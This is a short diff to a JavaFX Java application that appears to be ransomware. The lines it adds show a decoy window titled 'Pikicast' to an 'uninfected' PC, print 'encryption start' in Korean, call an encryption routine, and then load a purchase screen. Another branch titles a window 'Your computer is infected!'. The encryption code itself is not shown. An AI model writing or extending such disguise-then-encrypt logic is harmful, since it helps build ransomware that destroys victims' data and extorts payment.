@@ -32,9 +32,15 @@ public class Main extends Application {
             stage.setTitle("당신의 컴퓨터는 감염되었습니다!");
             stage.setScene(scene);
         } else {
+            System.out.println("감염되지 않은 PC 입니다. Pikicast를 보여줍니다.");
             scene = new Scene(FXMLLoader.load(getClass().getResource("MainPage.fxml")));
+            stage.setTitle("Pikicast");
             stage.setScene(scene);
 
+            Main.stage = stage;
+            Main.stage.show();
+
+            System.out.println("암호화 시작");
             encryptionController.encryption();
 
             scene = new Scene(FXMLLoader.load(getClass().getResource("Purchase.fxml")));
